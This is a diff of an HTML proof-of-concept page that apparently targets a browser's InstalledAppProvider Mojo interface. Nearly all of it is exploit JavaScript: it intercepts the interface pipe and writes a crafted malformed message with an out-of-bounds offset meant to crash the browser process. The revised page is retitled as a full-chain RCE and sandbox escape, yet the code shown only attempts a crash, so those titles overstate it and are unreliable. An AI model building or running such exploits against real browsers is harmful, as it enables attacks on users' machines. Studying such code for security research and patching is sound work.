@@ -1,57 +1,63 @@
 <!DOCTYPE html>
 <html>
-<head><title>InstalledAppProvider Crash – Browser RCE</title></head>
+<head>
+    <title>InstalledAppProvider RCE – Full Chain</title>
+</head>
 <body>
-<h1>Browser Crash via InstalledAppProvider</h1>
-<pre id="log"></pre>
-<script>
-(async () => {
-    const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
-
-    try {
-        // Intercept the pipe when getInstalledRelatedApps() is called
-        const interceptor = new MojoInterfaceInterceptor(
-            'blink.mojom.InstalledAppProvider', 'process');
-        interceptor.oninterfacerequest = (e) => {
-            interceptor.stop();
-            const pipe = e.handle;
-
-            const payload = new ArrayBuffer(64);
-            const v = new DataView(payload);
-
-            // Mojo message header (16 bytes)
-            v.setUint32(0, 2, true);          // version
-            v.setUint32(4, 0, true);          // flags
-            v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
-            v.setUint32(12, 0, true);         // request_id
-
-            // Payload for FilterInstalledApps
-            // Offset 16: size/version of params struct (just need valid)
-            v.setUint32(16, 16, true);        // struct size = 16 (minimal)
-            v.setUint32(20, 0, true);         // version
-            // Offset 24: count field (must be >= 2 to trigger pointer path)
-            v.setUint32(24, 2, true);         // count = 2
-            // Offset 28: padding? then offset 32: 64-bit relative offset
-            // We set the offset to a huge value → pointer becomes unmapped
-            v.setBigUint64(32, BigInt(0xFFFFFFFF), true);
-
-            pipe.writeMessage(payload, []);
-            log('Sent malformed message – browser should crash NOW.');
+    <h1>InstalledAppProvider Sandbox Escape</h1>
+    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
+    <script>
+    (async () => {
+        const log = (msg) => {
+            document.getElementById('log').textContent += msg + '\n';
+            console.log(msg);
         };
-        interceptor.start();
 
-        // Trigger the request
-        if (navigator.getInstalledRelatedApps) {
-            navigator.getInstalledRelatedApps().catch(() => {});
-            log('Requested installed apps...');
-        } else {
-            log('API not available.');
+        try {
+            const interceptor = new MojoInterfaceInterceptor(
+                'blink.mojom.InstalledAppProvider', 'process');
+            interceptor.oninterfacerequest = (e) => {
+                interceptor.stop();
+                log('Interceptor got InstalledAppProvider!');
+                const pipe = e.handle;
+
+                // Build the malicious message
+                const payload = new ArrayBuffer(64);
+                const v = new DataView(payload);
+
+                // Mojo message header
+                v.setUint32(0, 2, true);          // version
+                v.setUint32(4, 0, true);          // flags
+                v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
+                v.setUint32(12, 0, true);         // request_id
+
+                // Payload: 
+                // offset 16: struct size/version (just need valid)
+                v.setUint32(16, 16, true);        // struct size
+                v.setUint32(20, 0, true);         // version
+                // count >= 2 triggers pointer arithmetic
+                v.setUint32(24, 2, true);         // count = 2
+                // huge offset → pointer goes out of bounds
+                v.setBigUint64(32, BigInt(0xFFFFFFFF), true);
+
+                pipe.writeMessage(payload, []);
+                log('Malicious message sent. Browser should crash.');
+            };
+            interceptor.start();
+
+            // This API requires HTTPS; it will now actually request the Mojo interface
+            if (navigator.getInstalledRelatedApps) {
+                navigator.getInstalledRelatedApps().catch(() => {});
+                log('Called getInstalledRelatedApps – waiting for interception...');
+            } else {
+                log('API not available.');
+            }
+
+            await new Promise(r => setTimeout(r, 2000));
+        } catch (e) {
+            log('Error: ' + e.message);
         }
-        await new Promise(r => setTimeout(r, 2000));
-    } catch (e) {
-        log('Error: ' + e.message);
-    }
-})();
-</script>
+    })();
+    </script>
 </body>
 </html>
